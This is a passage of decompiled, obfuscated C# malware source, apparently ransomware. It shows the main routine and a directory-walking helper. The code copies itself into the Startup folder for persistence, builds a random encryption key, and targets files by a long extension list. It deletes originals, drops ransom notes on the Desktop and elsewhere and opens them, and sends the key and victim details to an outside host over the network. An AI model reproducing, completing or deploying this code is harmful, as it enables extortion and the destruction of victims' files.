									IzvDPVDWsNMZj(CS_0024_003C_003E8__locals0.PUDDzPYRoE, CS_0024_003C_003E8__locals0.PUDDzPYRoE, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex14)
							{
								if (joesCNAxeHUI)
								{
									try
									{
										File.AppendAllText(jnRLNtXuRRg, _0082(107386518) + CS_0024_003C_003E8__locals0.PUDDzPYRoE + _0082(107386220) + ex14.Message + _0082(107396306));
									}
									catch (Exception)
									{
									}
								}
								iePhSHBTqLd++;
								return;
							}
						}
						if (IooTTsvIiwCN)
						{
							if (ZDxRrpKTbd != _0082(107386778))
							{
								KGSDHYAAGYu(CS_0024_003C_003E8__locals0.PUDDzPYRoE + ZDxRrpKTbd, bytes2);
							}
							else
							{
								KGSDHYAAGYu(CS_0024_003C_003E8__locals0.PUDDzPYRoE, bytes2);
							}
						}
					}
					end_IL_031b_2:;
				}
				catch (Exception)
				{
				}
			}
			goto IL_0ab8;
			IL_0ab8:
			WNvdcTPDgW.Remove(CS_0024_003C_003E8__locals0.PUDDzPYRoE);
		}

		static kFfBlUyayStE()
		{
			Strings.CreateGetStringDelegate(typeof(kFfBlUyayStE));
		}
	}

	private sealed class wVXqIBGGPLo
	{
		public string atoCyWSfKSy;

		public string fRxskrnPHhc;

		public void _003CEncrypt2_003Eb__3f()
		{
			while (true)
			{
				try
				{
					File.Delete(atoCyWSfKSy);
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}

		public void _003CEncrypt2_003Eb__40()
		{
			while (true)
			{
				try
				{
					if (File.Exists(fRxskrnPHhc))
					{
						File.Delete(fRxskrnPHhc);
					}
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}
	}

	public static string tTTuIqIyTVsKt;

	public static byte[] lrVhqMPbYlaOK;

	public static string kvJFoDYMuC;

	public static string cJvZgRMCiiT;

	public static List<string> HoHveMjVjvX;

	public static List<string> YtNGHYTThvg;

	public static string YsJopGaPpPETyH;

	public static string nyAmnOdcSzzfJ;

	public static string AFNtNBdAhEf;

	public static string zcPzHRZXYSoC;

	public static int PNgOzFQmoBxwkpD;

	public static string cySCSfjuDKIn;

	public static string mfIGHgxpUFhf;

	public static string vCBJiLpGmJSnD;

	public static string ARhmLIZgWToPak;

	public static string HUAsnTLTOzrk;

	public static string TaRSuIXzPFDe;

	public static string EBwCzzKShZJF;

	public static string xRKOGhAaTewo;

	public static List<string> vooFhNgKVZyUs;

	public static List<string> SlSeSNfJnzNh;

	public static string gqVCQVtJiavX;

	public static string oLgSSCEqAmbBry;

	public static string zSIqMRAKpkZZcGjv;

	public static List<string> yGkMwQPqUdXIj;

	public static string MSHRwSPpwmqxM;

	private static string FAZqQTFurwccxTs;

	public static string iEHeKlEPYHGI;

	public static string xYvGfyjIeZ;

	public static List<string> ZSNcfBFfJEfqQ;

	public static List<string> iSGwXCiIfXBR;

	public static List<string> jFoYvbvoLRCagvDFmn;

	public static List<string> BSHtnNKwjXivMJS;

	public static string AbUTAcXZWDez;

	public static List<string> hkXnlfpoGpnf;

	public static List<string> gNbydKfEzpWjv;

	public static string apDKFRuernzH;

	public static string rmnvFBReavI;

	internal static DateTime mfBqYHSOySd;

	internal static DateTime mvolkwWivlBcrm;

	public static string CdQMIPJOkrOUDSy;

	public static string xYkYbBCyjIxz;

	public static string eIevaseXuHQaH;

	public static string bdIGvvMoxCbM;

	public static string TuoGtjjIwGaoMFyS;

	public static string ofNBDRGhqfTF;

	public static string kdEfNQYswVmDU;

	public static string bxhZXFvKXZl;

	public static List<string> EKjYgfCTgvyfhvOPx;

	public static string vEWBFQaTPDgk;

	public static string PyFcFDpqJkSW;

	public static string MIRuXWVFFoLwtz;

	public static string VsxmPTvejQSFs;

	public static string ZxaKxHsjfdsdTvNKy;

	public static string KtQjokjXHZXUlt;

	public static string nvUGpJjfEl;

	public static string esDOwQNWzCks;

	public static string RzJDQuVkTCTlk;

	public static string vKUIQhdzgPHwb;

	public static string GfViqMwSHVEX;

	public static string IUCNbNITnGCo;

	public static string sQphlXbTpcR;

	public static string ltuxRtIPjttT;

	public static string aDFaQrSzgBxEj;

	public static string nLNEEVaUjoQklOdfI;

	public static string anwdjQbJZQFrk;

	public static string PxoomWcCvZubT;

	public static string NRDQBoJkcw;

	public static string LIbWxYpDOmPy;

	public static string rHeEvpAbjCjyvEaC;

	public static string NfiNMrNQVxA;

	public static string JOmKsEZdamZ;

	public static string befQPNWerVGdKp;

	public static string aEpEnRRNDPnpp;

	public static string QArBXOfqRoEA;

	public static string QGAYpwMzxm;

	public static string cbYwmSYgAK;

	public static string tMTGisYcNMVHo;

	public static string[] tPINiNFcqTnZtQ;

	public static string POXokwFKrkkHxdVH;

	public static bool VGKELVlTFUV;

	public static string ZHbEFyHPlfyw;

	public static bool IooTTsvIiwCN;

	public static bool fOGrPeGaBiaPoAHL;

	public static bool MVhCfgBRSEUkeJ;

	public static bool NBgAYvhpqTo;

	public static string jnRLNtXuRRg;

	public static bool joesCNAxeHUI;

	public static bool XqTYpFCObzAK;

	public static bool WmBMdIXNbOD;

	public static bool upflSQRmeWP;

	public static bool EcdpqbMrQOzfdgL;

	public static string diaHTfOFnw;

	public static bool qoRjYABduZF;

	public static Stopwatch uYmJJOwnKLBSZO;

	public static int iePhSHBTqLd;

	public static int XnicJWCgBOO;

	public static bool MiZHZrKmtKkaPXn;

	public static string RBZnAGRnuwHeRmi;

	public static string[] sohDoFMGJgbq;

	public static List<string> HXQxyzlRKB;

	public static int rHOZvgFGaXKMdexR;

	private static ThreadStart CS_0024_003C_003E9__CachedAnonymousMethodDelegatee;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate13;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate14;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate15;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate16;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate17;

	[NonSerialized]
	internal static GetString _0014;

	private static void Main(string[] P_0)
	{
		try
		{
			dkdfdmXmxAk CS_0024_003C_003E8__locals0 = new dkdfdmXmxAk();
			CS_0024_003C_003E8__locals0.sZxLlvESUzLZXKq = Process.GetCurrentProcess().ProcessName;
			if (Process.GetProcesses().Count((Process P_0) => P_0.ProcessName == CS_0024_003C_003E8__locals0.sZxLlvESUzLZXKq) > 1)
			{
				return;
			}
		}
		catch (Exception)
		{
		}
		try
		{
			oFzjyQZaztDJ.QdsUxwYDRCW(FAZqQTFurwccxTs);
		}
		catch (Exception)
		{
		}
		try
		{
			if (QArBXOfqRoEA == _0014(107396855))
			{
				Thread thread = new Thread(YbwphERrMyQNP.nxNqSDnFrzzj);
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
		}
		catch
		{
		}
		if (vCBJiLpGmJSnD == _0014(107396855))
		{
			Thread.Sleep(int.Parse(ARhmLIZgWToPak));
		}
		if (MIRuXWVFFoLwtz == _0014(107396855))
		{
			try
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					OjfhzFWYFdyA CS_0024_003C_003E8__locals1 = new OjfhzFWYFdyA();
					CS_0024_003C_003E8__locals1.JNtjaLfncUVSAvQ = new string[4]
					{
						GwTsezEgVAuVAU(_0014(107396850)),
						GwTsezEgVAuVAU(_0014(107396865)),
						GwTsezEgVAuVAU(_0014(107396816)),
						GwTsezEgVAuVAU(_0014(107396787))
					};
					Thread thread2 = new Thread((ThreadStart)delegate
					{
						PmZcbpYMQkkuHdO.xRTdqUJOGhXP(CS_0024_003C_003E8__locals1.JNtjaLfncUVSAvQ);
					});
					thread2.IsBackground = true;
					thread2.Start();
				}
			}
			catch
			{
			}
			try
			{
				tEHWewuHPsL.xmOmWWdnfrenPY(GwTsezEgVAuVAU(_0014(107396865)));
			}
			catch
			{
			}
			try
			{
				tEHWewuHPsL.xmOmWWdnfrenPY(GwTsezEgVAuVAU(_0014(107396787)));
			}
			catch
			{
			}
			try
			{
				tEHWewuHPsL.xmOmWWdnfrenPY(GwTsezEgVAuVAU(_0014(107396802)));
			}
			catch
			{
			}
			try
			{
				tEHWewuHPsL.xmOmWWdnfrenPY(GwTsezEgVAuVAU(_0014(107396816)));
			}
			catch
			{
			}
			Thread thread3 = new Thread(PmZcbpYMQkkuHdO.SmzpdOGqBUsqf);
			thread3.IsBackground = true;
			thread3.Start();
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && kdEfNQYswVmDU == _0014(107396855))
		{
			try
			{
				xcFsifoFernH(GwTsezEgVAuVAU(_0014(107396753)));
			}
			catch
			{
			}
		}
		try
		{
			if (EBwCzzKShZJF == _0014(107396855) && CyVDCXKNZkh.fziPGhgQsXRkJJwbm())
			{
				new dDyurqCmIYO().iRhAYdJtRklx(false);
				CyVDCXKNZkh.jDuYrMVMSFRfuZ();
			}
		}
		catch (Exception)
		{
		}
		if (oLgSSCEqAmbBry == _0014(107396855) && CyVDCXKNZkh.fziPGhgQsXRkJJwbm())
		{
			new dDyurqCmIYO().iRhAYdJtRklx(false);
			new dDyurqCmIYO().snmtsQVthnGhgVm();
		}
		if (mfIGHgxpUFhf == _0014(107396855))
		{
			SXJylLGRkSghP.AfvdtDeOuqUqWT();
		}
		try
		{
			ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
			string fileName = mainModule.FileName;
			string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + _0014(107397192);
			string text2 = text + Path.GetFileName(fileName);
			if (zcPzHRZXYSoC == _0014(107396855) && fileName != text2)
			{
				Thread thread4 = new Thread(OqNXuKZRwQi);
				thread4.IsBackground = true;
				thread4.Priority = ThreadPriority.Normal;
				thread4.Start();
			}
			if (YsJopGaPpPETyH == _0014(107396855) && mainModule != null && fileName != text2)
			{
				try
				{
					PNgOzFQmoBxwkpD = NBIIvjpPJwlyjG(0, vooFhNgKVZyUs.Count);
					File.Copy(fileName, text + vooFhNgKVZyUs[PNgOzFQmoBxwkpD], overwrite: true);
					Process.Start(text + vooFhNgKVZyUs[PNgOzFQmoBxwkpD]);
					yQfvyropwD();
					Process.GetCurrentProcess().Kill();
				}
				catch (Exception)
				{
				}
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (apDKFRuernzH == _0014(107396855) && DateTime.Now < mfBqYHSOySd)
			{
				return;
			}
		}
		catch
		{
		}
		try
		{
			if (rmnvFBReavI == _0014(107396855) && DateTime.Now > mvolkwWivlBcrm)
			{
				yQfvyropwD();
			}
		}
		catch
		{
		}
		UQZfYOBEqlkpb();
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatee == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegatee = delegate
			{
				List<string> source = iSGwXCiIfXBR;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 = delegate(string P_0)
					{
						KXNiSRaxzeIpPt(GwTsezEgVAuVAU(_0014(107386181)), P_0);
					};
				}
				Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegate13);
				List<string> source2 = jFoYvbvoLRCagvDFmn;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 = delegate(string P_0)
					{
						KXNiSRaxzeIpPt(GwTsezEgVAuVAU(_0014(107386136)), P_0);
					};
				}
				Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate14);
				if (tMTGisYcNMVHo == _0014(107396855))
				{
					string[] source3 = tPINiNFcqTnZtQ;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 = delegate(string P_0)
						{
							KXNiSRaxzeIpPt(GwTsezEgVAuVAU(_0014(107386136)), _0014(107386143) + P_0 + _0014(107386102));
						};
					}
					Parallel.ForEach(source3, CS_0024_003C_003E9__CachedAnonymousMethodDelegate15);
				}
				if (!PAhtGWwudbxozQK().Contains(_0014(107386878)))
				{
					AiwyVzAQMcDi(AbUTAcXZWDez);
				}
				else
				{
					List<string> bSHtnNKwjXivMJS = BSHtnNKwjXivMJS;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 = delegate(string P_0)
						{
							KXNiSRaxzeIpPt(GwTsezEgVAuVAU(VSGqbgWciAAQ(_0014(107386097))), P_0);
						};
					}
					Parallel.ForEach(bSHtnNKwjXivMJS, CS_0024_003C_003E9__CachedAnonymousMethodDelegate16);
				}
				List<string> source4 = hkXnlfpoGpnf;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate17 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate17 = delegate(string P_0)
					{
						KXNiSRaxzeIpPt(GwTsezEgVAuVAU(_0014(107386072)), P_0);
					};
				}
				Parallel.ForEach(source4, CS_0024_003C_003E9__CachedAnonymousMethodDelegate17);
			};
		}
		Thread thread5 = new Thread(CS_0024_003C_003E9__CachedAnonymousMethodDelegatee);
		thread5.Priority = ThreadPriority.Normal;
		thread5.IsBackground = true;
		thread5.Start();
		try
		{
			if (File.Exists(Path.Combine(Directory.GetCurrentDirectory(), _0014(107397187))))
			{
				string[] array = File.ReadAllLines(Path.Combine(Directory.GetCurrentDirectory(), _0014(107397187)));
				string[] array2 = array;
				foreach (string text3 in array2)
				{
					if (text3.Contains(_0014(107397138)))
					{
						string text4 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text4))
						{
							string[] array3 = text4.Split(new char[1] { ',' });
							foreach (string text5 in array3)
							{
								string text6 = text5.Trim();
								if (Directory.Exists(text6) && !HoHveMjVjvX.Contains(text6) && text6 != _0014(107397149) && text6 != _0014(107397128) && text6 != _0014(107397075))
								{
									HoHveMjVjvX.Add(text6);
								}
							}
						}
					}
					if (text3.Contains(_0014(107397046)))
					{
						string text7 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text7) && text7.ToLower() == _0014(107397065))
						{
							sQphlXbTpcR = _0014(107396855);
						}
						else if (!string.IsNullOrEmpty(text7) && text7.ToLower() == _0014(107397056))
						{
							sQphlXbTpcR = _0014(107397015);
						}
					}
				}
			}
		}
		catch (Exception ex6)
		{
			if (joesCNAxeHUI)
			{
				try
				{
					File.AppendAllText(jnRLNtXuRRg, _0014(107397010) + ex6.Message);
				}
				catch (Exception)
				{
				}
			}
		}
		if (sQphlXbTpcR == _0014(107397015))
		{
			GClBSyQehj();
		}
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && MVhCfgBRSEUkeJ)
			{
				try
				{
					Thread thread6 = new Thread(IUmAujruwdxT.NcgkgbiyeApEB);
					thread6.IsBackground = true;
					thread6.Start();
				}
				catch
				{
				}
			}
		}
		catch (Exception)
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			KXNiSRaxzeIpPt(_0014(107396997), GwTsezEgVAuVAU(_0014(107396440)));
		}
		SecureString secureString = new SecureString();
		if (eIevaseXuHQaH == _0014(107397015))
		{
			Random random = new Random();
			for (int k = 0; k < 32; k++)
			{
				char value = (char)(random.Next(33, 127) % 255);
				if (Convert.ToInt32(value) == 34 || Convert.ToInt32(value) == 92)
				{
					k--;
				}
				else
				{
					secureString.AppendChar(Convert.ToChar(value));
				}
			}
		}
		else
		{
			nyAmnOdcSzzfJ = _0014(107396367);
		}
		AFNtNBdAhEf = FlpXYRWvTX.ZTvekdOmyg(cYzqjSUrbP(secureString));
		if (WmBMdIXNbOD)
		{
			try
			{
				if (!File.Exists(Path.Combine(Directory.GetCurrentDirectory(), diaHTfOFnw)))
				{
					File.WriteAllText(Path.Combine(Directory.GetCurrentDirectory(), diaHTfOFnw), string.Concat(GwTsezEgVAuVAU(_0014(107396354)), new WebClient().DownloadString(GwTsezEgVAuVAU(_0014(107396329))), _0014(107396288), GwTsezEgVAuVAU(_0014(107396251)), DateTime.Now, _0014(107396288), GwTsezEgVAuVAU(_0014(107396210)), AFNtNBdAhEf));
				}
				else
				{
					File.AppendAllText(Path.Combine(Directory.GetCurrentDirectory(), diaHTfOFnw), _0014(107396665) + AFNtNBdAhEf);
				}
			}
			catch (Exception ex9)
			{
				if (joesCNAxeHUI)
				{
					try
					{
						File.AppendAllText(jnRLNtXuRRg, _0014(107396636) + ex9.Message + _0014(107396288));
					}
					catch (Exception)
					{
					}
				}
			}
		}
		cqqMHKHKHQkt.MzToDMiFBwaOs(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), LIbWxYpDOmPy), mpBrVYdLlDe(AFNtNBdAhEf), null, null, _0014(107396619), _0014(107396570), null);
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			NzZJHUVbSXZd();
		}
		try
		{
			try
			{
				if (qoRjYABduZF)
				{
					Console.WriteLine(_0014(107396585));
				}
			}
			catch
			{
			}
			gwzRtxANhzJ(new string[1] { _0014(107396504) }, new string[100]
			{
				_0014(107396495),
				_0014(107396522),
				_0014(107396517),
				_0014(107396476),
				_0014(107396471),
				_0014(107396466),
				_0014(107396461),
				_0014(107396488),
				_0014(107396483),
				_0014(107396478),
				_0014(107395929),
				_0014(107395924),
				_0014(107395947),
				_0014(107395942),
				_0014(107395933),
				_0014(107395896),
				_0014(107395891),
				_0014(107395886),
				_0014(107395913),
				_0014(107395908),
				_0014(107395867),
				_0014(107395862),
				_0014(107395857),
				_0014(107395884),
				_0014(107395879),
				_0014(107395874),
				_0014(107395869),
				_0014(107395832),
				_0014(107395827),
				_0014(107395822),
				_0014(107395849),
				_0014(107395844),
				_0014(107395839),
				_0014(107395802),
				_0014(107395793),
				_0014(107395820),
				_0014(107395815),
				_0014(107395810),
				_0014(107396461),
				_0014(107395805),
				_0014(107396483),
				_0014(107395764),
				_0014(107395759),
				_0014(107395786),
				_0014(107395781),
				_0014(107395776),
				_0014(107395739),
				_0014(107395734),
				_0014(107395729),
				_0014(107395756),
				_0014(107395751),
				_0014(107395746),
				_0014(107395741),
				_0014(107395704),
				_0014(107395699),
				_0014(107395694),
				_0014(107395721),
				_0014(107395716),
				_0014(107396187),
				_0014(107396182),
				_0014(107396173),
				_0014(107396192),
				_0014(107395805),
				_0014(107396147),
				_0014(107396170),
				_0014(107396161),
				_0014(107396120),
				_0014(107396111),
				_0014(107396134),
				_0014(107396129),
				_0014(107396088),
				_0014(107396079),
				_0014(107396102),
				_0014(107396097),
				_0014(107396060),
				_0014(107396055),
				_0014(107396050),
				_0014(107396045),
				_0014(107396072),
				_0014(107396063),
				_0014(107396026),
				_0014(107396021),
				_0014(107396016),
				_0014(107396043),
				_0014(107396038),
				_0014(107396029),
				_0014(107395988),
				_0014(107395983),
				_0014(107395839),
				_0014(107396010),
				_0014(107396005),
				_0014(107396000),
				_0014(107395963),
				_0014(107395958),
				_0014(107395949),
				_0014(107395976),
				_0014(107395971),
				_0014(107395418),
				_0014(107395413),
				_0014(107395408)
			}, new string[0], cYzqjSUrbP(secureString), _0014(107395435));
		}
		catch (Exception ex11)
		{
			if (joesCNAxeHUI)
			{
				try
				{
					File.AppendAllText(jnRLNtXuRRg, _0014(107395422) + ex11.Message);
				}
				catch (Exception)
				{
				}
			}
			try
			{
				secureString.Dispose();
			}
			catch
			{
			}
		}
		try
		{
			secureString.Dispose();
		}
		catch
		{
		}
		try
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + _0014(107395397)))
			{
				using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + _0014(107395397));
				streamWriter.WriteLine(GwTsezEgVAuVAU(_0014(107395364)));
				streamWriter.WriteLine(_0014(107396288));
				streamWriter.WriteLine(GwTsezEgVAuVAU(_0014(107393418)));
				streamWriter.WriteLine(AFNtNBdAhEf);
				if (iEHeKlEPYHGI == _0014(107397015))
				{
					streamWriter.WriteLine(_0014(107396288));
					streamWriter.WriteLine(GwTsezEgVAuVAU(_0014(107392873)) + Convert.ToString(yGkMwQPqUdXIj.Count));
				}
				if (MiZHZrKmtKkaPXn)
				{
					streamWriter.WriteLine(_0014(107396288));
					streamWriter.WriteLine(GwTsezEgVAuVAU(_0014(107392764)));
					streamWriter.WriteLine(GyWbmViNanxKl.nFyAFAYBITHjh());
				}
			}
			else
			{
				string text8 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + _0014(107395397));
				if (!text8.Contains(AFNtNBdAhEf) && !IooTTsvIiwCN)
				{
					File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + _0014(107395397), _0014(107392731) + AFNtNBdAhEf);
				}
			}
		}
		catch
		{
		}
		int num = 0;
		foreach (string item in SlSeSNfJnzNh)
		{
			num++;
			try
			{
				if (item == Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
				{
					continue;
				}
			}
			catch
			{
			}
			try
			{
				if (!File.Exists(item + _0014(107395397)))
				{
					File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + _0014(107395397), item + _0014(107395397), overwrite: true);
				}
				else
				{
					string text9 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + _0014(107395397));
					if (!text9.Contains(AFNtNBdAhEf) && !IooTTsvIiwCN)
					{
						File.AppendAllText(item + _0014(107395397), _0014(107392731) + AFNtNBdAhEf);
					}
				}
			}
			catch (Exception)
			{
			}
			if (!NBgAYvhpqTo && num > 10)
			{
				break;
			}
		}
		if (JOmKsEZdamZ == _0014(107396855))
		{
			try
			{
				if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + _0014(107392734)))
				{
					using StreamWriter streamWriter2 = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + _0014(107392734));
					streamWriter2.WriteLine(GwTsezEgVAuVAU(_0014(107392701)));
					streamWriter2.WriteLine(_0014(107396288));
					streamWriter2.WriteLine(GwTsezEgVAuVAU(_0014(107389483)));
					streamWriter2.WriteLine(AFNtNBdAhEf + GwTsezEgVAuVAU(_0014(107389362)));
					if (iEHeKlEPYHGI == _0014(107397015))
					{
						streamWriter2.WriteLine(_0014(107396288));
						streamWriter2.WriteLine(GwTsezEgVAuVAU(_0014(107389381)) + GwTsezEgVAuVAU(_0014(107392873)) + Convert.ToString(yGkMwQPqUdXIj.Count) + GwTsezEgVAuVAU(_0014(107389362)));
					}
					if (MiZHZrKmtKkaPXn)
					{
						streamWriter2.WriteLine(_0014(107396288));
						streamWriter2.WriteLine(GwTsezEgVAuVAU(_0014(107392764)));
						streamWriter2.WriteLine(GyWbmViNanxKl.nFyAFAYBITHjh());
					}
				}
				else
				{
					string text10 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + _0014(107395397));
					if (!text10.Contains(AFNtNBdAhEf) && !IooTTsvIiwCN)
					{
						File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + _0014(107392734), GwTsezEgVAuVAU(_0014(107389381)) + _0014(107392731) + AFNtNBdAhEf + GwTsezEgVAuVAU(_0014(107389362)));
					}
				}
			}
			catch
			{
			}
		}
		if (MSHRwSPpwmqxM == _0014(107396855))
		{
			try
			{
				if (iEHeKlEPYHGI == _0014(107397015))
				{
					GyWbmViNanxKl.ATmjNWylGeJO(_0014(107389320), _0014(107389315), _0014(107388758), string.Concat(GwTsezEgVAuVAU(_0014(107396354)), new WebClient().DownloadString(GwTsezEgVAuVAU(_0014(107396329))), _0014(107388749), GwTsezEgVAuVAU(_0014(107396251)), DateTime.Now, _0014(107396288), GwTsezEgVAuVAU(_0014(107388776)), Convert.ToString(yGkMwQPqUdXIj.Count), _0014(107396288), GwTsezEgVAuVAU(_0014(107396210)), AFNtNBdAhEf));
				}
				else
				{
					GyWbmViNanxKl.ATmjNWylGeJO(_0014(107389320), _0014(107389315), _0014(107388758), string.Concat(GwTsezEgVAuVAU(_0014(107396354)), new WebClient().DownloadString(GwTsezEgVAuVAU(_0014(107396329))), _0014(107388749), GwTsezEgVAuVAU(_0014(107396251)), DateTime.Now, _0014(107396288), GwTsezEgVAuVAU(_0014(107388776)), Convert.ToString(yGkMwQPqUdXIj.Count), _0014(107396288), GwTsezEgVAuVAU(_0014(107396210)), AFNtNBdAhEf));
				}
			}
			catch
			{
			}
		}
		if (xRKOGhAaTewo == _0014(107396855))
		{
			try
			{
				ccZAZbktzmqn.ETTZIVoqCtRonH(new Uri(_0014(107388695)));
			}
			catch
			{
			}
		}
		if (JOmKsEZdamZ == _0014(107397015))
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + _0014(107395397)))
				{
					Process.Start(GwTsezEgVAuVAU(_0014(107388694)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + _0014(107395397));
				}
			}
			catch
			{
			}
		}
		else
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + _0014(107392734)))
				{
					Process.Start(GwTsezEgVAuVAU(_0014(107388701)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + _0014(107392734));
				}
			}
			catch
			{
			}
		}
		if (!string.IsNullOrEmpty(KtQjokjXHZXUlt))
		{
			try
			{
				File.Delete(KtQjokjXHZXUlt);
			}
			catch
			{
			}
		}
		try
		{
			if (File.Exists(Path.Combine(Directory.GetCurrentDirectory(), _0014(107397187))))
			{
				File.Delete(Path.Combine(Directory.GetCurrentDirectory(), _0014(107397187)));
			}
		}
		catch (Exception ex14)
		{
			try
			{
				File.AppendAllText(jnRLNtXuRRg, _0014(107388684) + ex14.Message);
			}
			catch (Exception)
			{
			}
		}
		if (joesCNAxeHUI)
		{
			try
			{
				File.AppendAllText(jnRLNtXuRRg, _0014(107388639));
			}
			catch (Exception)
			{
			}
		}
		if (tTTuIqIyTVsKt == _0014(107388594))
		{
			yQfvyropwD();
		}
	}

	public static void OqNXuKZRwQi()
	{
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(GwTsezEgVAuVAU(_0014(107388617)), GwTsezEgVAuVAU(_0014(107388943)), (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	private static int NBIIvjpPJwlyjG(int P_0, int P_1)
	{
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[4];
		rNGCryptoServiceProvider.GetBytes(array);
		int seed = BitConverter.ToInt32(array, 0);
		return new Random(seed).Next(P_0, P_1);
	}

	public static List<string> bUTxlfgHAvCR(string P_0, string[] P_1, string P_2, string[] P_3, string P_4)
	{
		List<string> list = new List<string>();
		Stack<string> stack = new Stack<string>(20);
		stack.Push(P_0);
		while (stack.Count > 0)
		{
			string text = stack.Pop();
			string[] directories;
			try
			{
				directories = Directory.GetDirectories(text);
			}
			catch
			{
				continue;
			}
			string[] array = null;
			try
			{
				if (text.Contains(_0014(107388914)) || text.Contains(_0014(107388889)) || text.Contains(_0014(107388856)) || text.ToLower().Contains(_0014(107388871)) || text.ToLower().Contains(_0014(107388826)) || text.Contains(_0014(107388833)) || text.Contains(_0014(107388812)) || text.ToLower().Contains(_0014(107388799)) || text.ToLower().Contains(_0014(107388242)) || text.ToLower().Contains(_0014(107388205)) || text.ToLower().Contains(_0014(107388228)) || text.ToLower().Contains(_0014(107388179)) || text.ToLower().Contains(_0014(107388198)) || text.ToLower().Contains(_0014(107388153)) || text.ToLower().Contains(_0014(107388164)))
				{
					continue;
				}
				array = Directory.GetFiles(text);
				goto IL_01f1;
			}
			catch
			{
			}
			continue;
			IL_01f1:
			string[] array2 = array;
			foreach (string fileName in array2)
			{
				try
				{
					FileInfo fileInfo = new FileInfo(fileName);
					if (!fileInfo.FullName.Contains(_0014(107388139)) && !fileInfo.FullName.Contains(_0014(107388090)) && !fileInfo.FullName.Contains(_0014(107388105)) && !fileInfo.FullName.Contains(_0014(107388056)) && !fileInfo.FullName.Contains(_0014(107388071)) && !fileInfo.FullName.Contains(_0014(107388022)) && !fileInfo.FullName.Contains(_0014(107388037)) && !fileInfo.FullName.Contains(_0014(107388500)) && !fileInfo.FullName.Contains(_0014(107388519)) && !fileInfo.FullName.Contains(_0014(107388466)) && !fileInfo.FullName.ToLower().Contains(_0014(107388485)) && !fileInfo.FullName.ToLower().Contains(_0014(107388440)) && !fileInfo.FullName.ToLower().Contains(_0014(107388455)) && !fileInfo.FullName.ToLower().Contains(_0014(107388406)) && !fileInfo.FullName.Contains(GwTsezEgVAuVAU(_0014(107388421))) && !fileInfo.FullName.Contains(_0014(107388396)) && !fileInfo.FullName.Contains(_0014(107397187)) && !fileInfo.FullName.Contains(_0014(107388383)) && !fileInfo.FullName.EndsWith(_0014(107395435)) && !fileInfo.FullName.EndsWith(_0014(107388358)) && !fileInfo.FullName.EndsWith(_0014(107388353)) && !fileInfo.FullName.EndsWith(_0014(107388316)) && !fileInfo.FullName.EndsWith(_0014(107388311)) && !fileInfo.FullName.Contains(_0014(107388306)) && !fileInfo.FullName.Contains(LIbWxYpDOmPy) && !fileInfo.FullName.Contains(jnRLNtXuRRg) && !fileInfo.FullName.Contains(diaHTfOFnw))
					{
						if (File.Exists(fileInfo.FullName) && (double)fileInfo.Length <= double.Parse(cJvZgRMCiiT) * 1024.0 * 1024.0 && kvJFoDYMuC == _0014(107396855))
